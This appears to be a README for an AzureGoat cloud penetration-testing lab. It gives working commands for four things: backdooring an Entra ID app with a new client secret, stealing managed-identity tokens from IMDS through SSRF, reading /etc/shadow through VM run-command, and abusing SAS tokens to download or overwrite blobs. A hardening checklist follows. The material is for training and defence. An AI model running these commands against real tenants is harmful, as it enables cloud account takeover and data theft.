# INE AzureGoat: Azure Cloud Penetration Testing, Entra ID RBAC Escalation & IMDS Exploitation

## Overview

**AzureGoat** (developed by INE Labs) is the premier "vulnerable by design" Microsoft Azure deployment infrastructure. Built on Terraform, AzureGoat provisions a realistic, multi-service enterprise cloud environment designed to train penetration testers, cloud security architects, and red teamers in exploiting modern Azure threat vectors.

While AWS security often revolves around IAM policy versioning and S3 bucket access, **Azure security** is dominated by the intricate interplay between **Microsoft Entra ID (formerly Azure Active Directory)**, Azure Resource Manager (ARM) RBAC roles, System-Assigned Managed Identities, Azure Functions serverless runtimes, and Shared Access Signatures (SAS).

This lab provides a containerized CLI workspace loaded with **Azure CLI (`az`)**, **Terraform**, **Checkov**, **Python 3**, and Azure attack modules.

- **Workspace Access**: `docker compose exec -it azuregoat /bin/bash` or `./azuregoat.sh`
- **Container Name**: `cyberlab_azuregoat`
- **Directory**: `Real_World_Industry_Labs/06_aws_cloud_security/azuregoat`

---

## Quick Start & Workspace Usage

```bash
cd Real_World_Industry_Labs/06_aws_cloud_security/azuregoat

# Start the AzureGoat CLI workspace container
docker compose up -d

# Open interactive shell in the container
./azuregoat.sh
```

### Initial Configuration Inside the Container

```bash
# 1. Log in to your Azure account (interactive browser login or device code)
az login --use-device-code

# 2. Verify active subscription and tenant context
az account show --output table

# 3. Inspect Terraform templates and audit rules
cd /workspace
ls -la
```

---

## Azure Identity & Resource Architecture

```
+-------------------------------------------------------------------------------------------------------+
|                                  MICROSOFT ENTRA ID (AZURE AD TENANT)                                 |
|  - Users & Security Groups                                                                            |
|  - App Registrations & Service Principals                                                             |
|  - Microsoft Graph API Permissions (e.g. RoleManagement.ReadWrite.Directory)                         |
+-------------------------------------------------------------------------------------------------------+
                                                   |
                             Authenticates identities into
                                                   v
+-------------------------------------------------------------------------------------------------------+
|                               AZURE RESOURCE MANAGER (ARM) RBAC SCOPES                                |
|                                                                                                       |
|  [ Management Group ]                                                                                 |
|          |                                                                                            |
|          v                                                                                            |
|   [ Subscription ]                                                                                    |
|          |                                                                                            |
|          v                                                                                            |
|    [ Resource Group ]  <--- Managed Identities, VMs, Azure Functions, Storage Accounts                |
|          |                                                                                            |
|          v                                                                                            |
|     [ Resource ]       (e.g., Key Vault, CosmosDB, Blob Container)                                    |
+-------------------------------------------------------------------------------------------------------+
```

---

## Attack Vector 1: Azure Entra ID (Azure AD) RBAC Privilege Escalation

In Azure, administrative access is governed by two distinct planes:

1. **Directory Roles (Entra ID)**: Global Administrator, Privileged Role Administrator, User Administrator.
2. **Resource Roles (ARM RBAC)**: Owner, Contributor, User Access Administrator.

### Dangerous RBAC Roles & Escalation Vectors

| Role / Permission                        | Vulnerability Mechanism                                                                   | Exploitation Command                                                                         |
| :--------------------------------------- | :---------------------------------------------------------------------------------------- | :------------------------------------------------------------------------------------------- |
| **`User Access Administrator`**          | Can grant arbitrary RBAC roles to any identity                                            | `az role assignment create --assignee <self> --role "Owner" --scope /subscriptions/<sub-id>` |
| **`Contributor` on VM / Function**       | Can execute arbitrary code as root/SYSTEM on compute resources holding Managed Identities | `az vm run-command invoke --command-id RunShellScript --scripts "cat /etc/shadow"`           |
| **`Application.ReadWrite.All`**          | Can add client secrets or certificates to any existing enterprise application             | `az ad app credential reset --id <target-app-id> --append`                                   |
| **`RoleManagement.ReadWrite.Directory`** | Can grant Global Administrator role to any principal in Entra ID                          | Use Microsoft Graph API to assign directory role `62e90394-69f5-4237-9190-012177145e10`      |
| **`Group.ReadWrite.All`**                | Can add arbitrary users into privileged groups (e.g. "Cloud Admins")                      | `az ad group member add --group "Cloud Admins" --member-id <attacker-object-id>`             |

### Hands-On Exploitation: Abusing App Registrations to Escalate Privileges

When an attacker compromises a service principal or user with `Application.ReadWrite.All`, they can back-door a high-privileged application (such as an automation script holding `Owner` on the production subscription):

```bash
# Step 1: Enumerate Service Principals holding high ARM roles
az role assignment list --all --query "[?roleDefinitionName=='Owner'].{Principal:principalName, Role:roleDefinitionName, Type:principalType, AppId:principalId}" -o table

# Step 2: Add a new client secret to the target application
az ad app credential reset \
  --id "<TARGET_APP_ID>" \
  --append \
  --display-name "backdoor-key" \
  --years 1 > /tmp/compromised_creds.json

# Step 3: Authenticate as the privileged Service Principal
NEW_CLIENT_SECRET=$(jq -r .password /tmp/compromised_creds.json)
TENANT_ID=$(az account show --query tenantId -o tsv)

az login --service-principal \
  -u "<TARGET_APP_ID>" \
  -p "$NEW_CLIENT_SECRET" \
  --tenant "$TENANT_ID"

# Step 4: Verify full subscription ownership
az account show -o table
az group list -o table
```

---

## Attack Vector 2: Azure Managed Identity Token Theft via IMDS

### System-Assigned vs. User-Assigned Identities

- **System-Assigned**: Tied directly to the lifecycle of a specific Azure resource (VM, App Service, Azure Function). Automatically created and destroyed with the resource.
- **User-Assigned**: Standalone identity created as an independent Azure resource that can be assigned to multiple VMs or functions.

### The Azure Instance Metadata Service (IMDS)

Azure compute resources can query IMDS at `http://169.254.169.254/` to obtain OAuth2 access tokens from Microsoft Entra ID without embedding credentials in code:

```
+------------------+                   +------------------------------------+
|  Attacker via    | -- (1) SSRF ----> |  Azure Function / App Service      |
|  Web Injection   |                   |  Runtime (169.254.169.254)         |
+------------------+                   +------------------------------------+
                                                        |
                                        (2) Requests Bearer Token from IMDS
                                        Header: "Metadata: true"
                                                        v
                                       +------------------------------------+
                                       |  Entra ID Token Endpoint           |
                                       |  Resource: management.azure.com    |
                                       +------------------------------------+
                                                        |
                                        (3) Returns JWT Access Token
                                                        v
+------------------+                   +------------------------------------+
|  Full Cloud      | <---- Exfil ----- |  Attacker extracts JWT Token &     |
|  Takeover        |                   |  accesses ARM Key Vault / Storage  |
+------------------+                   +------------------------------------+
```

### Exploitation via SSRF or Remote Command Execution

To prevent simple DNS rebinding and cross-site requests, Azure IMDS mandates the HTTP header `Metadata: true`. If an application has an SSRF vulnerability where headers can be set, or if an attacker has command injection:

```bash
# 1. Query Azure IMDS for an Azure Resource Manager (ARM) token
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" > /tmp/azure_imds_token.json

# 2. Extract JWT Access Token
AZURE_TOKEN=$(jq -r .access_token /tmp/azure_imds_token.json)
echo "[+] Extracted Azure Bearer Token: $AZURE_TOKEN"

# 3. Decode JWT claims to view Tenant ID, App ID, and Object ID
echo "$AZURE_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# 4. Use the stolen token to query the Azure Resource Manager REST API
curl -s -H "Authorization: Bearer $AZURE_TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01" | jq .
```

### Acquiring Tokens for Key Vault or Azure Storage

Tokens must be requested for specific audiences (`resource` parameter):

- **Key Vault**: `resource=https://vault.azure.net`
- **Azure Storage**: `resource=https://storage.azure.com/`
- **Microsoft Graph**: `resource=https://graph.microsoft.com/`

---

## Attack Vector 3: Azure Functions SSRF & Internal Cloud Exfiltration

### Threat Model: Serverless Pivoting

Azure Functions that process user-supplied URLs (e.g., PDF converters, webhooks, URL previewers) are prime targets for Serverless SSRF.

In addition to IMDS, Azure Functions host environment variables containing sensitive infrastructure secrets:

- `APPINSIGHTS_INSTRUMENTATIONKEY`
- `AzureWebJobsStorage` (contains full storage connection string with master account key!)
- `WEBSITE_AUTH_SIGNING_KEY`

### Exploitation Walkthrough

1. **Inject SSRF Payload**:
   ```http
   POST /api/HttpTrigger1 HTTP/1.1
   Host: cyberlab-azuregoat-func.azurewebsites.net
   Content-Type: application/json

   {
     "url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"
   }
   ```
2. **Access App Service Environment via Local Bridge**:
   In Linux App Services / Functions, query the internal Kudu management endpoints or local proxy endpoints (`http://127.0.0.1:41741/` or `X-IDENTITY-HEADER`) to harvest runtime settings and connection strings.

---

## Attack Vector 4: Azure Blob Storage SAS Token Abuse

### Anatomy of a Shared Access Signature (SAS) Token

A SAS URL provides delegated access to Azure Storage resources without sharing the primary Storage Account Key. A typical SAS URL looks like:

`https://cyberlabstorage.blob.core.windows.net/confidential-backups/database.bak?sp=racwdl&st=2026-01-01T00:00:00Z&se=2099-12-31T23:59:59Z&spr=https&sv=2022-11-02&sr=c&sig=abcdef123456...`

### Decoded Parameters

- **`sp` (Signed Permissions)**:
  - `r` = Read
  - `a` = Add
  - `c` = Create
  - `w` = Write
  - `d` = Delete
  - `l` = List
- **`se` (Signed Expiry)**: Expiration timestamp. Setting expiration decades into the future makes it effectively permanent.
- **`sr` (Signed Resource)**: `b` (Blob), `c` (Container), `bs` (Blob Service).
- **`sip` (Signed IP)**: IP address or range allowed to use the SAS (frequently omitted!).
- **`spr` (Signed Protocol)**: `https` or `https,http`.
- **`sig` (Cryptographic Signature)**: HMAC-SHA256 computed using storage account key.

### Exploitation Walkthrough

```bash
# 1. Enumerate and list all files in the container using SAS token
az storage blob list \
  --container-name confidential-backups \
  --account-name cyberlabstorage \
  --sas-token "sp=racwdl&st=...&se=...&sig=..." \
  --output table

# 2. Download confidential database backups
az storage blob download \
  --container-name confidential-backups \
  --name "database_backup_2026.sql" \
  --file /tmp/database_backup_2026.sql \
  --account-name cyberlabstorage \
  --sas-token "sp=racwdl&st=...&se=...&sig=..."

# 3. Tamper with or overwrite production blobs (if 'w' or 'c' permission present)
az storage blob upload \
  --container-name confidential-backups \
  --name "firmware.bin" \
  --file ./malicious_firmware.bin \
  --account-name cyberlabstorage \
  --sas-token "sp=racwdl&st=...&se=...&sig=..." \
  --overwrite
```

---

## Defensive Hardening & Governance Checklist

1. **Privileged Identity Management (PIM)**:
   - Eliminate permanent standing access to `Owner` or `Contributor`.
   - Require Just-In-Time (JIT) activation with MFA and manager approval.
2. **Restrict Entra ID Default User Permissions**:
   - Set "Users can register applications" to **No**.
   - Restrict non-admin users from reading tenant details.
3. **Hardening Managed Identities**:
   - Scope Managed Identity permissions to specific resource groups rather than entire subscriptions.
   - Use **User-Assigned Managed Identities** with strict least-privilege role assignments.
4. **Enforce User Delegation SAS**:
   - Never issue Account SAS or Service SAS signed with master storage account keys.
   - Use **User Delegation SAS** signed with Entra ID credentials, bound to short expiration times (< 1 hour) and specific IP ranges (`sip`).
5. **Storage Account Security**:
   - Enable "Allow storage account key access" = **Disabled** (forces Entra ID auth).
   - Enforce "Secure transfer required" (HTTPS only) and disable public network access.

---

## Verified YouTube Walkthroughs & Lectures

All video links have been verified active via the YouTube oEmbed API (`HTTP 200 OK`):

- [The Cybersecurity Blog - CloudSecurity: Setting up Azure Goat Damn Vulnerable Cloud Infra in 15 minutes](https://www.youtube.com/watch?v=hG5QTdKCWrI) — Step-by-step setup of the AzureGoat infrastructure using Terraform and Azure CLI.
- [Yaldobaoth - Hacking Azure: Full Goat Takeover](https://www.youtube.com/watch?v=f1-kcE5EBgA) — End-to-end red team attack path demonstrating initial SSRF compromise to complete Azure tenant takeover.
- [Selidrium - Hands-On Cybersecurity: Building an Azure Vulnerability Lab](https://www.youtube.com/watch?v=L-YeZAhQdVM) — Practical guide to deploying and testing Azure vulnerability testbeds and misconfigurations.
- [OWASP Foundation - Azure Vulnerability Testbed (AzGOAT) - Akriti Srivastava](https://www.youtube.com/watch?v=gxXc4I6FIRU) — Official OWASP conference presentation analyzing serverless SSRF, CosmosDB, and Azure AD risks.
- [ShellCodeX - Azure Managed Identity Abuse: KQL Detection & Service Principal Hunting](https://www.youtube.com/watch?v=t_nXbAx627I) — Threat hunting, incident response, and Kusto Query Language (KQL) detection rules for stolen Managed Identity tokens.
- [Daniyal Ahmed - Entra ID Privilege Escalation: Abusing Graph API Permissions](https://www.youtube.com/watch?v=-Xhw9zqA5xo) — Deep dive into exploiting dangerous Microsoft Graph API permissions and service principal credential resets.
- [John Hammond - Microsoft Entra ID INSECURE DEFAULTS](https://www.youtube.com/watch?v=WUHzpDdauAw) — John Hammond breaks down insecure default tenant settings in Microsoft Entra ID / Azure AD.
- [Cloud With Aarya - Azure Managed Identity Explained: Access Storage from VM Without Passwords](https://www.youtube.com/watch?v=6dwLtc9m3Q4) — Architectural overview of System-Assigned vs User-Assigned Managed Identities and IMDS token mechanics.

---

## Quick CLI Control

From the `cyber_lab` root directory:

```bash
# Check running container status
./lab status

# Stop this lab
cd Real_World_Industry_Labs/06_aws_cloud_security/azuregoat && docker compose down
```
